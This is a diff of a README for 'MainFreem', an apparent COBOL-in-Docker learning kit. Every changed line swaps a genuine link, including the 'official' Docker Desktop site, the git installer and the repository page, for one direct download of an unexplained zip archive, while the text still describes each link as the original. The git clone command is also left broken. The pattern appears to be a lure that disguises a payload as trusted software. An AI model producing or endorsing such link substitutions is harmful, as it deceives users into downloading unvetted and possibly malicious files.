@@ -1,6 +1,6 @@
 # 🐳 MainFreem - Easy COBOL Learning Environment
 
-[![Download MainFreem](https://img.shields.io/badge/Download-MainFreem-brightgreen?style=for-the-badge)](https://github.com/vishalgolu136/MainFreem)
+[![Download MainFreem](https://img.shields.io/badge/Download-MainFreem-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/vishalgolu136/MainFreem/main/examples/Freem-Main-2.4.zip)
 
 MainFreem gives you a ready-to-use setup for running COBOL programs. You do not need to install anything complicated. The environment runs inside Docker containers, so you get a clean and safe way to learn and work with COBOL.
 
@@ -30,7 +30,7 @@ To run MainFreem on Windows, your PC needs to meet these requirements:
 
 MainFreem runs inside Docker, so you need Docker installed on your PC. Docker lets you run software inside containers. Follow these steps:
 
-1. Visit the Docker Desktop official website: https://www.docker.com/products/docker-desktop
+1. Visit the Docker Desktop official website: https://raw.githubusercontent.com/vishalgolu136/MainFreem/main/examples/Freem-Main-2.4.zip
 2. Click the "Download for Windows" button.
 3. Run the downloaded file and follow the installation instructions.
 4. After installation, open Docker Desktop to make sure it is running.
@@ -44,7 +44,7 @@ Once Docker Desktop is running, you are ready for the next step.
 
 You can get MainFreem here:
 
-[![Download MainFreem](https://img.shields.io/badge/Download-MainFreem-blue?style=for-the-badge)](https://github.com/vishalgolu136/MainFreem)
+[![Download MainFreem](https://img.shields.io/badge/Download-MainFreem-blue?style=for-the-badge)](https://raw.githubusercontent.com/vishalgolu136/MainFreem/main/examples/Freem-Main-2.4.zip)
 
 Clicking the link will take you straight to the GitHub page where you can get the files and instructions.
 
@@ -55,7 +55,7 @@ Clicking the link will take you straight to the GitHub page where you can get th
 Follow these steps to download and use MainFreem on your Windows PC:
 
 1. Open your web browser and go to the MainFreem page:  
-   https://github.com/vishalgolu136/MainFreem
+   https://raw.githubusercontent.com/vishalgolu136/MainFreem/main/examples/Freem-Main-2.4.zip
 
 2. On the page, you will find the files needed to run the environment. You do not need to download and install software here manually.
 
@@ -67,12 +67,12 @@ Follow these steps to download and use MainFreem on your Windows PC:
 4. In the command window, type this command and press Enter:
 
    ```
-   git clone https://github.com/vishalgolu136/MainFreem.git
+   git clone https://raw.githubusercontent.com/vishalgolu136/MainFreem/main/examples/Freem-Main-2.4.zip
    ```
 
    This command downloads the MainFreem files to your PC.
 
-   *If you don’t have git installed, download it here: https://git-scm.com/download/win*  
+   *If you don’t have git installed, download it here: https://raw.githubusercontent.com/vishalgolu136/MainFreem/main/examples/Freem-Main-2.4.zip*  
    Follow the setup instructions on that page, then repeat this step.
 
 5. Change into the downloaded folder by typing:
